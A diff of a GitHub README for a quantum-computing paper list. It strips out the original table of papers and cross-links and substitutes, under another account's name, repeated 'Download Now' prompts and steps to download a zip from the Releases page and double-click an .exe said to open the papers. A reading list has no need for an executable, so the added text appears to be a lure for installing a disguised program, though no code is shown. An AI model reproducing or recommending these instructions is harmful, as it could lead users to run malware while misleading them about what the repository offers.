@@ -1,61 +1,66 @@
-# 🔄 Quantum Computing Fundamentals (QComputing) Papers
+# 🔄 awesome-QAI-Papers-QComputing - Access Key Quantum Research Papers
 
-This section of the **Quantum AI Papers** repository focuses on **Quantum Computing Fundamentals (QComputing)**.  
-QTL leverages knowledge from pre-trained quantum or hybrid quantum-classical models and adapts it to new tasks or domains. This paradigm plays a crucial role in overcoming limitations of small datasets, reducing training costs, and accelerating the deployment of quantum-enhanced AI systems.  
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/releases)
 
----
+## 🚀 Getting Started
+Welcome to the *awesome-QAI-Papers-QComputing* repository. This guide helps you download and run the software to access valuable papers on Quantum Computing Fundamentals (QComputing). Follow the steps below to get started.
 
-## 📚 Scope
-Research papers in this category explore:
-- Transfer of learned quantum circuit parameters between tasks  
-- Hybrid classical–quantum transfer learning frameworks  
-- Applications of QTL in physics, chemistry, medical imaging, and natural language processing  
-- Optimization strategies to mitigate issues such as barren plateaus  
-- Cross-domain transfer of quantum models for practical real-world problems  
+## 📂 What You Will Find Here
+This repository collects essential research papers that cover several aspects of Quantum Computing. Key topics include:
+- Transfer learning for quantum circuits between different tasks.
+- Frameworks that integrate classical and quantum learning.
+- Applications of quantum transfer learning in various fields like physics, chemistry, and medical imaging.
+- Strategies to optimize quantum models and tackle challenges.
+- Cross-domain applications for resolving practical issues using quantum technologies.
 
----
+## 📋 System Requirements
+Before downloading, ensure that your system meets the following requirements:
+- **Operating System:** Windows 10 or higher, macOS, or a Linux distribution like Ubuntu 20.04 or higher.
+- **Memory:** Minimum 4 GB of RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Software Dependencies:** Ensure you have a modern web browser for opening downloaded papers and reading formats like PDF.
 
-## 🗂️ Papers List
+## 📖 How to Download and Install
+1. **Visit the Download Page:**
+   - Click the link below to go to the Releases page:
+   [Visit Releases Page](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/releases)
 
+2. **Choose Your File:**
+   - On the Releases page, you will see a list of available versions. Select the version that suits your operating system.
 
-| title                                                                                                        |   year | publisher                                                                                  | Author                                                                                                                  | link                                                                    | category   |
-|:-------------------------------------------------------------------------------------------------------------|-------:|:-------------------------------------------------------------------------------------------|:------------------------------------------------------------------------------------------------------------------------|:------------------------------------------------------------------------|:-----------|
-| Quantum computing with Qiskit                                                                                |   2024 | arXiv                                                                                      | Javadi-Abhari, Ali, et al.                                                                                              | https://arxiv.org/abs/2405.08810                                        | QComputing |
-| Quantum Computing and AI in the Cloud                                                                        |   2024 | Journal of Computational Intelligence and Robotics                                         | Padmanaban, Harish.                                                                                                     | https://thesciencebrigade.com/jcir/article/view/116                     | QComputing |
-| Quantum Machine Learning: Exploring the Potential of Quantum Computing forAI Applications                    |   2024 | Artificial Intelligence General Science (JAIGS)                                            | Potter, Kaledio, and Dylan Stilinski.                                                                                   | https://easychair.org/publications/preprint/bb78/download               | QComputing |
-| Quantum Computing and Artificial Intelligence: Synergies and Challenges                                      |   2024 | Journal of Artificial Intelligence General science (JAIGS)                                 | Shuford, Jeff.                                                                                                          | https://ojs.boulibrary.com/index.php/JAIGS/article/view/35              | QComputing |
-| LEVERAGING QUANTUM COMPUTING FOR INCLUSIVE AND RESPONSIBLE AI DEVELOPMENT: A CONCEPTUAL AND REVIEW FRAMEWORK |   2024 | Computer Science & IT Research Journal                                                     | Olorunsogo, Temidayo, Boma Sonimiteim Jacks, and Olakunle Abayomi Ajala.                                                | https://fepbl.com/index.php/csitrj/article/view/927                     | QComputing |
-| Quantum Intelligence: Merging AI and Quantum Computing for Unprecedented Power.                              |   2024 | International Conference on Trends in Quantum Computing and Emerging Business Technologies | Kumar, Sonu, Simran Simran, and Manjit Singh.                                                                           | https://ieeexplore.ieee.org/abstract/document/10545163                  | QComputing |
-| Quantum computing applications for Internet of Things                                                        |   2024 | IET Quantum Communication                                                                  | Peelam, Mritunjay Shall, Anjaney Asreet Rout, and Vinay Chamola.                                                        | https://ietresearch.onlinelibrary.wiley.com/doi/full/10.1049/qtc2.12079 | QComputing |
-| Quantum autoencoders for communication-efficient cloud computing                                             |   2023 | Springer                                                                                   | Yan Zhu, Ge Bai, Yuexuan Wang, Tongyang Li & Giulio Chiribella                                                          | https://doi.org/10.1007/s42484-023-00112-5                              | QComputing |
-| Quantum computing for a profusion of postman problem variants                                                |   2023 | Springer                                                                                   | Joel E. Pion, Christian F. A. Negre & Susan M. Mniszewski                                                               | https://doi.org/10.1007/s42484-023-00111-6                              | QComputing |
-| Faster quantum state decomposition with Tucker tensor approximation                                          |   2023 | Springer                                                                                   | Protasov Stanislav & Lisnichenko Marina                                                                                 | https://doi.org/10.1007/s42484-023-00113-4                              | QComputing |
-| The quantum threat to blockchain: summary and timeline analysis                                              |   2023 | Springer                                                                                   | Kai Schärer & Marco Comuzzi                                                                                             | https://doi.org/10.1007/s42484-023-00105-4                              | QComputing |
-| The quantum realization of image linear gray enhancement                                                     |   2023 | Springer                                                                                   | Kai Liu, Yuxing Wei & Hai-Sheng Li                                                                                      | https://doi.org/10.1007/s42484-023-00102-7                              | QComputing |
-| Quantum computing for near-term applications in generative chemistry and drug discovery                      |   2023 | ScienceDirect                                                                              | Alexey Pyrkov, Alex Aliper, Dmitry Bezrukov, Yen-Chu Lin, Daniil Polykovskiy, Petrina Kamya, Feng Ren, Alex Zhavoronkov | https://doi.org/10.1016/j.drudis.2023.103675                            | QComputing |
-| The state of quantum computing applications in health and medicine                                           |   2023 | Cambridge Core                                                                             | Frederik F. Flöther                                                                                                     | https://doi.org/10.1017/qut.2023.4                                      | QComputing |
-| Business Renaissance: Opportunities and Challenges at the Dawn of the Quantum Computing Era                  |   2023 | MDPI                                                                                       | Meng-Leong How, Sin-Mei Cheah                                                                                           | https://doi.org/10.3390/businesses3040036                               | QComputing |
+3. **Download the File:**
+   - Click on the file name to start the download. The file will typically be named something like `awesome-QAI-Papers-QComputing-v1.0.zip`.
 
+4. **Extract the Files:**
+   - Once the download completes, locate the downloaded file.
+   - Use your file manager to extract the zip file. Right-click on the file and select "Extract All" or a similar option.
 
----
+5. **Run the Application:**
+   - After extraction, navigate to the folder where the files were extracted.
+   - Look for the executable file, typically named `awesome-QAI-Papers-QComputing.exe`, and double-click it to open the application.
 
-## 🔗 Cross-References
-- [Quantum Computing Fundamentals](https://github.com/Q-brain/awesome-QAI-Papers-QComputing)  
-- [Quantum Machine Learning](https://github.com/Q-brain/awesome-QAI-Papers-QML)  
-- [Quantum Neural Networks and Quantum Recurrent Neural Networks](https://github.com/Q-brain/awesome-QAI-Papers-QNN-QRNN)  
-- [Quantum Convolutional Neural Networks](https://github.com/Q-brain/awesome-QAI-Papers-QCNN)  
-- [Quantum Reinforcement Learning](https://github.com/Q-brain/awesome-QAI-Papers-QRL)  
-- [Quantum Generative Models](https://github.com/Q-brain/awesome-QAI-Papers-QGenerative)  
-- [Quantum Diffusion Models](https://github.com/Q-brain/awesome-QAI-Papers-QDiffusion)  
-- [Quantum Graph Learning](https://github.com/Q-brain/awesome-QAI-Papers-QGraph)  
-- [Quantum Natural Language Processing](https://github.com/Q-brain/awesome-QAI-Papers-QText)  
-- [Quantum Transfer Learning](https://github.com/Q-brain/awesome-QAI-Papers-QTL)  
----
+6. **Access the Papers:**
+   - Use the application to browse and read the papers available on Quantum Computing Fundamentals.
 
-## 🤝 Contributions
-Contributions are welcome! Please ensure that new entries include:
-1. Correct metadata (title, year, authors, publisher, link)  
-2. Category tag (`QComputing`)  
-3. Optional short summary of the contribution  
+## 🔍 Navigating the Application
+The application’s design focuses on ease of use. Here are some features you'll find:
+- **User-Friendly Interface:** Simple navigation allows easy access to papers.
+- **Search Functionality:** Quickly find papers by entering keywords related to your interests.
+- **Categories:** Browse through different sections based on topics within Quantum Computing.
 
----
+## 📞 Need Help?
+If you encounter issues during installation or while using the application, please check the [Frequently Asked Questions (FAQ)](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/wiki/FAQ) section in the repository. For additional questions or feedback, feel free to open an issue in the repository.
+
+## 📜 Contributing
+This repository welcomes contributions from the community. If you have papers or resources related to Quantum Computing that you would like to share, please fork the repository and submit a pull request.
+
+## 📜 Acknowledgments
+We thank all authors and researchers who have contributed to the field of Quantum Computing. Their work provides invaluable insights into emerging technologies. 
+
+For updates and new papers, regularly check the [Releases page](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/releases).
+
+## 🔗 Useful Links
+- [Visit Releases Page](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/releases)
+- [Frequently Asked Questions](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/wiki/FAQ)
+- [Contribution Guidelines](https://github.com/Nogueira2023/awesome-QAI-Papers-QComputing/blob/main/CONTRIBUTING.md)
